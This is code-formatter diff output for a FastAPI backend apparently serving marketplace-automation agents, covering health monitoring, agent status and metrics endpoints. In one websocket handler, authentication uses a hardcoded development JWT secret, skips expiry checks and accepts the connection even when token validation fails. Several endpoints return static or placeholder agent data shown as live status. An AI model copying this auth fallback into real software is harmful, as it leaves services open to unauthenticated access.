 async def options_agent_by_id(agent_id: str):
     """Handle CORS preflight for specific agent endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/{agent_id}/status")
 async def options_agent_status(agent_id: str):
     """Handle CORS preflight for agent status endpoint."""
     return {"message": "OK"}
 
+
 @router.options("/{agent_id}/metrics")
 async def options_agent_metrics(agent_id: str):
     """Handle CORS preflight for agent metrics endpoint."""
     return {"message": "OK"}
+
 
 @router.options("/{agent_id}/decisions")
 async def options_agent_decisions(agent_id: str):
     """Handle CORS preflight for agent decisions endpoint."""
     return {"message": "OK"}
@@ -220,14 +228,14 @@
         self.last_update = datetime.now(timezone.utc)
 
     def register_agent(self, agent_id: str, agent_instance: Any) -> None:
         """Register an agent instance for monitoring."""
         self.agent_registry[agent_id] = {
-            'instance': agent_instance,
-            'registered_at': datetime.now(timezone.utc),
-            'last_health_check': None,
-            'consecutive_failures': 0
+            "instance": agent_instance,
+            "registered_at": datetime.now(timezone.utc),
+            "last_health_check": None,
+            "consecutive_failures": 0,
         }
         logger.info(f"Registered agent {agent_id} for health monitoring")
 
     async def get_health_snapshot(self) -> HealthSnapshot:
         """Get a real health snapshot from actual agent instances."""
@@ -244,19 +252,24 @@
                 agent_health[agent_id] = health
 
                 # Update overall status based on agent health
                 if health.status == MonitoringHealthStatus.FAILED:
                     overall_status = MonitoringHealthStatus.FAILED
-                elif health.status == MonitoringHealthStatus.DEGRADED and overall_status != MonitoringHealthStatus.FAILED:
+                elif (
+                    health.status == MonitoringHealthStatus.DEGRADED
+                    and overall_status != MonitoringHealthStatus.FAILED
+                ):
                     overall_status = MonitoringHealthStatus.DEGRADED
 
                 total_errors += health.error_count
 
             except Exception as e:
                 logger.error(f"Failed to get health for agent {agent_id}: {e}")
                 # Create a failed health status for this agent
-                agent_health[agent_id] = self._create_failed_agent_health(agent_id, str(e))
+                agent_health[agent_id] = self._create_failed_agent_health(
+                    agent_id, str(e)
+                )
                 overall_status = MonitoringHealthStatus.FAILED
                 total_errors += 1
 
         # If no agents are registered, create some default ones
         if not agent_health:
@@ -273,42 +286,44 @@
             system_metrics=system_metrics,
             active_alerts=[],
             timestamp=datetime.now(timezone.utc),
         )
 
-    async def _get_agent_health(self, agent_id: str, agent_info: Dict[str, Any]) -> AgentHealth:
+    async def _get_agent_health(
+        self, agent_id: str, agent_info: Dict[str, Any]
+    ) -> AgentHealth:
         """Get health information for a specific agent."""
-        agent_instance = agent_info['instance']
+        agent_instance = agent_info["instance"]
         now = datetime.now(timezone.utc)
 
         try:
             # Get metrics from the agent if available
             metrics = {}
             error_count = 0
             last_error = None
             status = MonitoringHealthStatus.RUNNING
 
-            if hasattr(agent_instance, 'get_metrics'):
+            if hasattr(agent_instance, "get_metrics"):
                 metrics = agent_instance.get_metrics()
-                error_count = metrics.get('error_count', 0)
-
-            if hasattr(agent_instance, 'metrics'):
+                error_count = metrics.get("error_count", 0)
+
+            if hasattr(agent_instance, "metrics"):
                 agent_metrics = agent_instance.metrics
-                error_count = agent_metrics.get('error_count', 0)
+                error_count = agent_metrics.get("error_count", 0)
 
             # Determine status based on error count and recent activity
             if error_count > 10:
                 status = MonitoringHealthStatus.DEGRADED
             elif error_count > 50:
                 status = MonitoringHealthStatus.FAILED
 
             # Calculate uptime
-            uptime = (now - agent_info['registered_at']).total_seconds()
+            uptime = (now - agent_info["registered_at"]).total_seconds()
 
             # Update health check info
-            agent_info['last_health_check'] = now
-            agent_info['consecutive_failures'] = 0
+            agent_info["last_health_check"] = now
+            agent_info["consecutive_failures"] = 0
 
             return AgentHealth(
                 agent_id=agent_id,
                 status=status,
                 uptime=uptime,
@@ -320,11 +335,11 @@
                 timestamp=now,
             )
 
         except Exception as e:
             # Mark as failed and increment failure count
-            agent_info['consecutive_failures'] += 1
+            agent_info["consecutive_failures"] += 1
             logger.error(f"Health check failed for agent {agent_id}: {e}")
 
             return self._create_failed_agent_health(agent_id, str(e))
 
     def _create_failed_agent_health(self, agent_id: str, error_msg: str) -> AgentHealth:
@@ -357,10 +372,11 @@
         )
 
     def _create_real_resource_metrics(self) -> Dict[ResourceType, ResourceMetrics]:
         """Create real resource metrics using system information."""
         import psutil
+
         now = datetime.now(timezone.utc)
 
         return {
             ResourceType.CPU: ResourceMetrics(
                 resource_type=ResourceType.CPU,
@@ -372,31 +388,34 @@
                 value=psutil.virtual_memory().percent / 100.0,
                 timestamp=now,
             ),
             ResourceType.DISK: ResourceMetrics(
                 resource_type=ResourceType.DISK,
-                value=psutil.disk_usage('/').percent / 100.0,
+                value=psutil.disk_usage("/").percent / 100.0,
                 timestamp=now,
             ),
         }
 
     async def _get_real_system_metrics(self, total_errors: int = 0) -> SystemMetrics:
         """Get real system metrics using system information."""
         import psutil
+
         now = datetime.now(timezone.utc)
 
         # Get network stats
         net_io = psutil.net_io_counters()
 
         return SystemMetrics(
             cpu_usage=psutil.cpu_percent() / 100.0,
             memory_usage=psutil.virtual_memory().percent / 100.0,
-            disk_usage=psutil.disk_usage('/').percent / 100.0,
+            disk_usage=psutil.disk_usage("/").percent / 100.0,
             network_in=float(net_io.bytes_recv),
             network_out=float(net_io.bytes_sent),
             total_requests=len(self.agent_registry) * 100,  # Estimate based on agents
-            success_rate=max(0.0, 1.0 - (total_errors / max(1, len(self.agent_registry) * 100))),
+            success_rate=max(
+                0.0, 1.0 - (total_errors / max(1, len(self.agent_registry) * 100))
+            ),
             avg_latency=0.05,  # This would need real measurement
             peak_latency=0.25,  # This would need real measurement
             total_errors=total_errors,
             resource_usage={},
             timestamp=now,
@@ -406,11 +425,11 @@
         """Get default agent health when no agents are registered."""
         default_agents = {
             "amazon_agent": "Amazon Marketplace Agent",
             "ebay_agent": "eBay Marketplace Agent",
             "inventory_agent": "Inventory Management Agent",
-            "executive_agent": "Executive Decision Agent"
+            "executive_agent": "Executive Decision Agent",
         }
 
         agent_health = {}
         for agent_id, description in default_agents.items():
             agent_health[agent_id] = AgentHealth(
@@ -429,10 +448,11 @@
 
 
 # Global health monitor instance
 _health_monitor_instance: Optional[RealHealthMonitor] = None
 
+
 # Helper function to get health monitor service
 async def get_health_monitor() -> HealthMonitor:
     """Get health monitor instance.
 
     Returns:
@@ -444,22 +464,25 @@
         _health_monitor_instance = RealHealthMonitor()
         logger.info("Created new RealHealthMonitor instance")
 
     return cast(HealthMonitor, _health_monitor_instance)
 
+
 # Helper function to get agent repository
 async def get_agent_repository() -> AgentRepository:
     """Get agent repository instance."""
     return AgentRepository()
 
+
 # Helper function to get database session
 def get_database_session():
     """Get database session dependency."""
+
     async def _get_session(request: Request):
         """Get database session from app state or global instance."""
         # Try to get database from app state first (initialized instance)
-        if hasattr(request.app.state, 'database') and request.app.state.database:
+        if hasattr(request.app.state, "database") and request.app.state.database:
             database = request.app.state.database
         else:
             # Fallback to global database instance
             database = get_database()
             # Check if it's initialized, if not, try to initialize it
@@ -476,14 +499,21 @@
     return _get_session
 
 
 # Endpoint implementations
 @router.get("/test")
-async def test_endpoint(test_param: str = Query("default", description="Test parameter")) -> Dict[str, str]:
+async def test_endpoint(
+    test_param: str = Query("default", description="Test parameter")
+) -> Dict[str, str]:
     """Test endpoint to verify route registration."""
     logger.info(f"Test endpoint called with test_param: {test_param}")
-    return {"message": "Test endpoint working", "status": "ok", "test_param": test_param}
+    return {
+        "message": "Test endpoint working",
+        "status": "ok",
+        "test_param": test_param,
+    }
+
 
 @router.get("/list")
 async def get_agents_list() -> List[Dict[str, Any]]:
     """Get list of individual agent objects for mobile app.
 
@@ -505,16 +535,22 @@
                 "currentTask": "Coordinating multi-agent workflows and strategic decisions",
                 "itemsProcessed": 342,
                 "metadata": {
                     "coordination_score": 0.96,
                     "decisions_made": 28,
-                    "workflow_efficiency": 0.91
+                    "workflow_efficiency": 0.91,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=6)).isoformat(),
-                "capabilities": ["strategic_planning", "agent_coordination", "decision_making", "workflow_management"]
-            },
-
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=6)
+                ).isoformat(),
+                "capabilities": [
+                    "strategic_planning",
+                    "agent_coordination",
+                    "decision_making",
+                    "workflow_management",
+                ],
+            },
             # Core Business Agents (3 agents)
             {
                 "id": "market_agent",
                 "name": "Market Agent",
                 "type": "market",
@@ -523,14 +559,21 @@
                 "currentTask": "Analyzing pricing strategies and market competition",
                 "itemsProcessed": 156,
                 "metadata": {
                     "platform": "ebay",
                     "category": "electronics",
-                    "performance_score": 0.92
+                    "performance_score": 0.92,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat(),
-                "capabilities": ["market_analysis", "price_optimization", "trend_detection", "competitor_monitoring"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=2)
+                ).isoformat(),
+                "capabilities": [
+                    "market_analysis",
+                    "price_optimization",
+                    "trend_detection",
+                    "competitor_monitoring",
+                ],
             },
             {
                 "id": "content_agent",
                 "name": "Content Agent",
                 "type": "content",
@@ -539,14 +582,21 @@
                 "currentTask": "Optimizing SEO and listing content",
                 "itemsProcessed": 89,
                 "metadata": {
                     "platform": "multiple",
                     "success_rate": 0.95,
-                    "avg_processing_time": 45
+                    "avg_processing_time": 45,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat(),
-                "capabilities": ["listing_optimization", "seo_enhancement", "content_creation", "image_processing"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=1)
+                ).isoformat(),
+                "capabilities": [
+                    "listing_optimization",
+                    "seo_enhancement",
+                    "content_creation",
+                    "image_processing",
+                ],
             },
             {
                 "id": "logistics_agent",
                 "name": "Logistics Agent",
                 "type": "logistics",
@@ -555,16 +605,22 @@
                 "currentTask": "Managing shipping and inventory operations",
                 "itemsProcessed": 67,
                 "metadata": {
                     "warehouse_efficiency": 0.88,
                     "shipping_accuracy": 0.99,
-                    "inventory_turnover": 2.3
+                    "inventory_turnover": 2.3,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=4)).isoformat(),
-                "capabilities": ["inventory_management", "shipping_optimization", "supplier_coordination", "fulfillment"]
-            },
-
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=4)
+                ).isoformat(),
+                "capabilities": [
+                    "inventory_management",
+                    "shipping_optimization",
+                    "supplier_coordination",
+                    "fulfillment",
+                ],
+            },
             # Specialized Market Agents (3 agents)
             {
                 "id": "listing_agent",
                 "name": "Listing Agent",
                 "type": "listing",
@@ -573,14 +629,20 @@
                 "currentTask": "Creating marketplace-specific optimized listings",
                 "itemsProcessed": 124,
                 "metadata": {
                     "optimization_rate": 0.87,
                     "conversion_improvement": 0.23,
-                    "platforms": ["ebay", "amazon"]
+                    "platforms": ["ebay", "amazon"],
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=3)).isoformat(),
-                "capabilities": ["listing_creation", "marketplace_optimization", "conversion_enhancement"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=3)
+                ).isoformat(),
+                "capabilities": [
+                    "listing_creation",
+                    "marketplace_optimization",
+                    "conversion_enhancement",
+                ],
             },
             {
                 "id": "advertising_agent",
                 "name": "Advertising Agent",
                 "type": "advertising",
@@ -589,14 +651,20 @@
                 "currentTask": "Managing advertising campaigns and bid optimization",
                 "itemsProcessed": 78,
                 "metadata": {
                     "campaign_performance": 0.84,
                     "roas": 3.2,
-                    "active_campaigns": 12
+                    "active_campaigns": 12,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=5)).isoformat(),
-                "capabilities": ["campaign_management", "bid_optimization", "ad_performance_analysis"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=5)
+                ).isoformat(),
+                "capabilities": [
+                    "campaign_management",
+                    "bid_optimization",
+                    "ad_performance_analysis",
+                ],
             },
             {
                 "id": "competitor_analyzer",
                 "name": "Enhanced Competitor Analyzer",
                 "type": "analytics",
@@ -605,16 +673,21 @@
                 "currentTask": "Deep competitive intelligence analysis",
                 "itemsProcessed": 203,
                 "metadata": {
                     "competitors_tracked": 45,
                     "analysis_depth": 0.93,
-                    "insights_generated": 18
+                    "insights_generated": 18,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat(),
-                "capabilities": ["competitive_analysis", "market_intelligence", "pricing_insights"]
-            },
-
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=2)
+                ).isoformat(),
+                "capabilities": [
+                    "competitive_analysis",
+                    "market_intelligence",
+                    "pricing_insights",
+                ],
+            },
             # Automation Agents (3 agents)
             {
                 "id": "auto_pricing_agent",
                 "name": "Auto Pricing Agent",
                 "type": "pricing",
@@ -623,14 +696,20 @@
                 "currentTask": "Dynamic pricing optimization and adjustments",
                 "itemsProcessed": 234,
                 "metadata": {
                     "strategy": "competitive",
                     "profit_margin": 0.18,
-                    "price_adjustments": 12
+                    "price_adjustments": 12,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=3)).isoformat(),
-                "capabilities": ["dynamic_pricing", "margin_optimization", "real_time_adjustments"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=3)
+                ).isoformat(),
+                "capabilities": [
+                    "dynamic_pricing",
+                    "margin_optimization",
+                    "real_time_adjustments",
+                ],
             },
             {
                 "id": "auto_listing_agent",
                 "name": "Auto Listing Agent",
                 "type": "automation",
@@ -639,14 +718,20 @@
                 "currentTask": "Automated listing creation and management",
                 "itemsProcessed": 156,
                 "metadata": {
                     "automation_rate": 0.91,
                     "success_rate": 0.88,
-                    "time_saved_hours": 24
+                    "time_saved_hours": 24,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=4)).isoformat(),
-                "capabilities": ["automated_listing", "bulk_operations", "template_management"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=4)
+                ).isoformat(),
+                "capabilities": [
+                    "automated_listing",
+                    "bulk_operations",
+                    "template_management",
+                ],
             },
             {
                 "id": "auto_inventory_agent",
                 "name": "Auto Inventory Agent",
                 "type": "inventory",
@@ -655,16 +740,21 @@
                 "currentTask": "Automated stock management and purchasing",
                 "itemsProcessed": 98,
                 "metadata": {
                     "stock_accuracy": 0.97,
                     "reorder_efficiency": 0.89,
-                    "cost_savings": 0.15
+                    "cost_savings": 0.15,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=5)).isoformat(),
-                "capabilities": ["stock_management", "automated_purchasing", "demand_forecasting"]
-            },
-
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=5)
+                ).isoformat(),
+                "capabilities": [
+                    "stock_management",
+                    "automated_purchasing",
+                    "demand_forecasting",
+                ],
+            },
             # Enhanced Analytics Agents (2 agents)
             {
                 "id": "trend_detector",
                 "name": "Enhanced Trend Detector",
                 "type": "analytics",
@@ -673,14 +763,20 @@
                 "currentTask": "Market trend analysis and forecasting",
                 "itemsProcessed": 187,
                 "metadata": {
                     "trends_identified": 23,
                     "accuracy_rate": 0.86,
-                    "forecast_horizon": "30_days"
+                    "forecast_horizon": "30_days",
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=3)).isoformat(),
-                "capabilities": ["trend_analysis", "market_forecasting", "pattern_recognition"]
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=3)
+                ).isoformat(),
+                "capabilities": [
+                    "trend_analysis",
+                    "market_forecasting",
+                    "pattern_recognition",
+                ],
             },
             {
                 "id": "market_analyzer",
                 "name": "Enhanced Market Analyzer",
                 "type": "analytics",
@@ -689,32 +785,46 @@
                 "currentTask": "Comprehensive market insights and analysis",
                 "itemsProcessed": 145,
                 "metadata": {
                     "market_coverage": 0.94,
                     "insight_quality": 0.91,
-                    "recommendations": 16
+                    "recommendations": 16,
                 },
-                "startTime": (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat(),
-                "capabilities": ["market_analysis", "comprehensive_insights", "strategic_recommendations"]
-            }
+                "startTime": (
+                    datetime.now(timezone.utc) - timedelta(hours=2)
+                ).isoformat(),
+                "capabilities": [
+                    "market_analysis",
+                    "comprehensive_insights",
+                    "strategic_recommendations",
+                ],
+            },
         ]
 
-        logger.info(f"Returning {len(agents_list)} agents (complete 12-agent architecture) for mobile app")
+        logger.info(
+            f"Returning {len(agents_list)} agents (complete 12-agent architecture) for mobile app"
+        )
         return agents_list
 
     except Exception as e:
         logger.error(f"Error getting agents list: {str(e)}")
-        raise HTTPException(status_code=500, detail=f"Error getting agents list: {str(e)}")
+        raise HTTPException(
+            status_code=500, detail=f"Error getting agents list: {str(e)}"
+        )
+
 
 @router.options("/")
 @router.options("")  # CORS preflight support
 async def agents_options():
     """Handle CORS preflight requests for agents endpoint."""
     return {"message": "OK"}
 
+
 @router.get("/")
-async def get_agents_overview(request: Request) -> Union[Dict[str, Any], List[Dict[str, Any]]]:
+async def get_agents_overview(
+    request: Request,
+) -> Union[Dict[str, Any], List[Dict[str, Any]]]:
     """Get overview of all agents and system status, or list of individual agents.
 
     Automatically detects if request is from mobile app and returns appropriate format.
 
     Returns:
@@ -753,50 +863,70 @@
                     "market_agent": "market",
                     "executive_agent": "executive",
                     "content_agent": "content",
                     "logistics_agent": "logistics",
                     "amazon_agent": "marketplace",
-                    "ebay_agent": "marketplace"
+                    "ebay_agent": "marketplace",
                 }
 
                 # Get agent type or default to the agent_id prefix
-                agent_type = agent_type_mapping.get(agent_id, agent_id.split('_')[0] if '_' in agent_id else "general")
+                agent_type = agent_type_mapping.get(
+                    agent_id, agent_id.split("_")[0] if "_" in agent_id else "general"
+                )
 
                 # Calculate uptime in seconds
                 uptime_seconds = int(health.uptime) if health.uptime else 0
 
                 # Get current task based on agent type and status
                 current_task_mapping = {
                     "market": "Analyzing market trends and pricing data",
                     "executive": "Coordinating agent workflows and decisions",
                     "content": "Optimizing product listings and descriptions",
                     "logistics": "Managing inventory and shipping operations",
-                    "marketplace": "Monitoring marketplace performance and compliance"
+                    "marketplace": "Monitoring marketplace performance and compliance",
                 }
 
-                current_task = current_task_mapping.get(agent_type, f"Processing {agent_type} operations")
+                current_task = current_task_mapping.get(
+                    agent_type, f"Processing {agent_type} operations"
+                )
                 if health.status.value != "running":
                     current_task = f"Agent {health.status.value}"
 
                 # Create agent status object matching Flutter AgentStatus model
                 agent_status = {
                     "agentId": agent_id,
                     "agentType": agent_type,
                     "status": health.status.value,
-                    "lastActivity": health.last_success.isoformat() if health.last_success else datetime.now(timezone.utc).isoformat(),
+                    "lastActivity": (
+                        health.last_success.isoformat()
+                        if health.last_success
+                        else datetime.now(timezone.utc).isoformat()
+                    ),
                     "taskCount": health.error_count,  # Use error count as task indicator for now
-                    "errorMessage": str(health.last_error) if health.last_error else None,
+                    "errorMessage": (
+                        str(health.last_error) if health.last_error else None
+                    ),
                     "version": "1.0.0",
                     "uptime": uptime_seconds,
-                    "cpuUsage": health.resource_metrics.get("cpu_usage", {}).get("value", 0.0) if health.resource_metrics else 0.0,
-                    "memoryUsage": health.resource_metrics.get("memory_usage", {}).get("value", 0.0) if health.resource_metrics else 0.0,
+                    "cpuUsage": (
+                        health.resource_metrics.get("cpu_usage", {}).get("value", 0.0)
+                        if health.resource_metrics
+                        else 0.0
+                    ),
+                    "memoryUsage": (
+                        health.resource_metrics.get("memory_usage", {}).get(
+                            "value", 0.0
+                        )
+                        if health.resource_metrics
+                        else 0.0
+                    ),
                     "currentTask": current_task,
                     "metadata": {
                         "last_health_check": health.timestamp.isoformat(),
                         "consecutive_failures": 0,
-                        "performance_score": max(0.0, 1.0 - (health.error_count * 0.1))
-                    }
+                        "performance_score": max(0.0, 1.0 - (health.error_count * 0.1)),
+                    },
                 }
 
                 agents_list.append(agent_status)
 
             logger.info(f"Returning {len(agents_list)} real agents for mobile app")
@@ -826,20 +956,21 @@
                 "avg_latency": snapshot.system_metrics.avg_latency,
             },
             "endpoints": {
                 "status": "/api/v1/agents/status",
                 "system_metrics": "/api/v1/agents/system/metrics",
-                "websocket": "/api/v1/agents/ws/status"
-            }
+                "websocket": "/api/v1/agents/ws/status",
+            },
         }
     except Exception as e:
         logger.error(f"Error getting agents overview: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
+            "status": "error",
         }
+
 
 @router.get("/system/metrics")
 async def get_system_metrics() -> Dict[str, Any]:
     """Get system metrics without authentication.
 
@@ -854,11 +985,11 @@
         now = datetime.now(timezone.utc)
 
         # Get system metrics
         cpu_percent = psutil.cpu_percent(interval=1)
         memory = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
+        disk = psutil.disk_usage("/")
         net_io = psutil.net_io_counters()
 
         # Get process metrics
         process = psutil.Process()
 
@@ -868,85 +999,87 @@
                 "cpu_usage_percent": cpu_percent,
                 "memory": {
                     "total_bytes": memory.total,
                     "available_bytes": memory.available,
                     "used_bytes": memory.used,
-                    "usage_percent": memory.percent
+                    "usage_percent": memory.percent,
                 },
                 "disk": {
                     "total_bytes": disk.total,
                     "free_bytes": disk.free,
                     "used_bytes": disk.used,
-                    "usage_percent": (disk.used / disk.total) * 100
+                    "usage_percent": (disk.used / disk.total) * 100,
                 },
                 "network": {
                     "bytes_sent": net_io.bytes_sent,
                     "bytes_received": net_io.bytes_recv,
                     "packets_sent": net_io.packets_sent,
-                    "packets_received": net_io.packets_recv
-                }
+                    "packets_received": net_io.packets_recv,
+                },
             },
             "process": {
                 "cpu_percent": process.cpu_percent(),
                 "memory_percent": process.memory_percent(),
                 "memory_info": {
                     "rss": process.memory_info().rss,
-                    "vms": process.memory_info().vms
+                    "vms": process.memory_info().vms,
                 },
                 "num_threads": process.num_threads(),
-                "num_fds": process.num_fds() if hasattr(process, 'num_fds') else None,
-                "create_time": process.create_time()
-            },
-            "status": "operational"
+                "num_fds": process.num_fds() if hasattr(process, "num_fds") else None,
+                "create_time": process.create_time(),
+            },
+            "status": "operational",
         }
     except ImportError:
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": "psutil not available",
-            "status": "limited"
+            "status": "limited",
         }
     except Exception as e:
         logger.error(f"Error getting system metrics: {e}")
         return {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "error": str(e),
-            "status": "error"
+            "status": "error",
         }
 
 
 @router.get("/status", response_model=AllAgentStatusResponse)
 async def get_all_agent_statuses(
     request: Request,
     health_monitor: HealthMonitor = Depends(get_health_monitor),
     agent_repository: AgentRepository = Depends(get_agent_repository),
-    session = Depends(get_database_session())
+    session=Depends(get_database_session()),
 ) -> AllAgentStatusResponse:
     """Get statuses of all agents.
 
     Returns:
         AllAgentStatusResponse: Status information for all agents.
     """
     try:
         # Try to use real agent manager if available
-        real_agent_manager = getattr(request.app.state, 'real_agent_manager', None)
+        real_agent_manager = getattr(request.app.state, "real_agent_manager", None)
 
         if real_agent_manager:
             # Use real agent manager for status
             agent_data = await real_agent_manager.get_all_agent_statuses()
 
             agent_statuses = []
             for agent_id, agent_info in agent_data["agents"].items():
                 if agent_info:  # Check if agent_info is not None
-                    agent_statuses.append(AgentStatusResponse(
-                        agent_id=agent_id,
-                        status=agent_info.get("status", "unknown"),
-                        uptime=agent_info.get("uptime", 0.0),
-                        error_count=agent_info.get("error_count", 0),
-                        last_error=None,  # Could be enhanced to include actual last error
-                        last_success=agent_info.get("last_activity"),
-                        timestamp=datetime.now(timezone.utc),
-                    ))
+                    agent_statuses.append(
+                        AgentStatusResponse(
+                            agent_id=agent_id,
+                            status=agent_info.get("status", "unknown"),
+                            uptime=agent_info.get("uptime", 0.0),
+                            error_count=agent_info.get("error_count", 0),
+                            last_error=None,  # Could be enhanced to include actual last error
+                            last_success=agent_info.get("last_activity"),
+                            timestamp=datetime.now(timezone.utc),
+                        )
+                    )
 
             return AllAgentStatusResponse(
                 agents=agent_statuses,
                 overall_status=agent_data.get("overall_status", "unknown"),
                 timestamp=datetime.now(timezone.utc),
@@ -959,11 +1092,13 @@
             agent_statuses = []
 
             # Combine database and health monitor data
             for agent_id, health in snapshot.agent_health.items():
                 # Find corresponding database status
-                db_status = next((s for s in db_agent_statuses if s.agent_id == agent_id), None)
+                db_status = next(
+                    (s for s in db_agent_statuses if s.agent_id == agent_id), None
+                )
 
                 agent_statuses.append(
                     AgentStatusResponse(
                         agent_id=agent_id,
                         status=db_status.status if db_status else health.status.value,
@@ -1079,11 +1214,11 @@
     ),
     end_time: Optional[datetime] = Query(None, description="End time for decisions"),
     decision_type: Optional[str] = Query(None, description="Filter by decision type"),
     limit: int = Query(20, description="Maximum number of decisions to return"),
     agent_repository: AgentRepository = Depends(get_agent_repository),
-    session = Depends(get_database_session())
+    session=Depends(get_database_session()),
 ) -> AgentDecisionsListResponse:
     """Get decision history for a specific agent.
 
     Args:
         agent_id: ID of the agent
@@ -1102,26 +1237,26 @@
         if start_time is None:
             start_time = end_time - timedelta(days=1)
 
         # Get decisions from database
         decisions = await agent_repository.get_pending_decisions(
-            session=session,
-            agent_id=agent_id,
-            decision_type=decision_type
+            session=session, agent_id=agent_id, decision_type=decision_type
         )
 
         # Convert to response format
         decision_responses = []
         for decision in decisions[:limit]:
-            decision_responses.append(AgentDecisionResponse(
-                decision_id=str(decision.id),
-                timestamp=decision.created_at,
-                decision_type=decision.decision_type,
-                parameters=decision.parameters or {},
-                confidence=decision.confidence or 0.0,
-                rationale=decision.rationale or "No rationale provided"
-            ))
+            decision_responses.append(
+                AgentDecisionResponse(
+                    decision_id=str(decision.id),
+                    timestamp=decision.created_at,
+                    decision_type=decision.decision_type,
+                    parameters=decision.parameters or {},
+                    confidence=decision.confidence or 0.0,
+                    rationale=decision.rationale or "No rationale provided",
+                )
+            )
 
         return AgentDecisionsListResponse(
             agent_id=agent_id,
             decisions=decision_responses,
             start_time=start_time,
@@ -1236,17 +1371,22 @@
 
         # For development, accept any non-empty token
         # In production, validate JWT signature and expiration
         try:
             import jwt
+
             # Use development secret (same as in auth service)
             secret = "development-jwt-secret-not-for-production-use"
-            payload = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_exp": False})
+            payload = jwt.decode(
+                token, secret, algorithms=["HS256"], options={"verify_exp": False}
+            )
             user_id = payload.get("sub", "unknown")
             logger.info(f"Token validated for user: {user_id}")
         except Exception as jwt_error:
-            logger.warning(f"JWT validation failed, but allowing for development: {jwt_error}")
+            logger.warning(
+                f"JWT validation failed, but allowing for development: {jwt_error}"
+            )
             user_id = "dev_user"
 
         # If validation passes, accept the connection
         await websocket.accept()
 
@@ -1388,17 +1528,17 @@
 
 @router.post("/test-connections", response_model=Dict[str, Any])
 async def test_agent_connections(request: Request) -> Dict[str, Any]:
     """Test connections for all real agents."""
     try:
-        real_agent_manager = getattr(request.app.state, 'real_agent_manager', None)
+        real_agent_manager = getattr(request.app.state, "real_agent_manager", None)
 
         if not real_agent_manager:
             return {
                 "success": False,
                 "message": "Real agent manager not available",
-                "results": {}
+                "results": {},
             }
 
         # Test connections for all agents
         results = await real_agent_manager.test_agent_connections()
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/api/routes/agents.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/agents/response_processor.py	2025-06-14 20:35:30.775706+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/agents/response_processor.py	2025-06-19 04:03:47.404220+00:00
@@ -17,216 +17,234 @@
 
 
 class AgentResponseProcessor:
     """
     Standardized response processing utilities for conversational agents.
-    
+
     Eliminates code duplication across ContentAgent, LogisticsAgent, and ExecutiveAgent
     by providing unified response processing, confidence calculation, and metadata handling.
     """
-    
+
     # Confidence calculation weights by agent type
     CONFIDENCE_WEIGHTS = {
         "content": {
             "data_quality": 0.3,
             "seo_score": 0.25,
             "template_match": 0.2,
             "keyword_relevance": 0.15,
-            "readability": 0.1
+            "readability": 0.1,
         },
         "logistics": {
             "data_accuracy": 0.35,
             "cost_optimization": 0.25,
             "delivery_reliability": 0.2,
             "carrier_availability": 0.15,
-            "route_efficiency": 0.05
+            "route_efficiency": 0.05,
         },
         "executive": {
             "strategic_alignment": 0.4,
             "financial_impact": 0.3,
             "risk_assessment": 0.2,
-            "implementation_feasibility": 0.1
-        }
+            "implementation_feasibility": 0.1,
+        },
     }
-    
+
     # Approval thresholds by agent type and request type
     APPROVAL_THRESHOLDS = {
         "content": {
             "generate": {"auto_approve": 0.85, "requires_human": 0.6},
             "optimize": {"auto_approve": 0.8, "requires_human": 0.65},
             "template": {"auto_approve": 0.9, "requires_human": 0.7},
-            "analyze": {"auto_approve": 0.75, "requires_human": 0.5}
+            "analyze": {"auto_approve": 0.75, "requires_human": 0.5},
         },
         "logistics": {
             "shipping": {"auto_approve": 0.8, "requires_human": 0.6},
             "inventory": {"auto_approve": 0.85, "requires_human": 0.65},
             "tracking": {"auto_approve": 0.9, "requires_human": 0.7},
-            "optimization": {"auto_approve": 0.75, "requires_human": 0.55}
+            "optimization": {"auto_approve": 0.75, "requires_human": 0.55},
         },
         "executive": {
             "strategic": {"auto_approve": 0.7, "requires_human": 0.5},
             "financial": {"auto_approve": 0.75, "requires_human": 0.55},
             "investment": {"auto_approve": 0.8, "requires_human": 0.6},
-            "resource": {"auto_approve": 0.85, "requires_human": 0.65}
-        }
+            "resource": {"auto_approve": 0.85, "requires_human": 0.65},
+        },
     }
-    
+
     @classmethod
     def calculate_confidence(
         cls,
         agent_type: str,
         response_data: Dict[str, Any],
-        metrics: Optional[Dict[str, float]] = None
+        metrics: Optional[Dict[str, float]] = None,
     ) -> float:
         """
         Calculate confidence score for agent response using standardized weights.
-        
+
         Args:
             agent_type: Type of agent (content, logistics, executive)
             response_data: Response data containing quality metrics
             metrics: Optional custom metrics to include
-            
+
         Returns:
             Confidence score between 0.0 and 1.0
         """
         try:
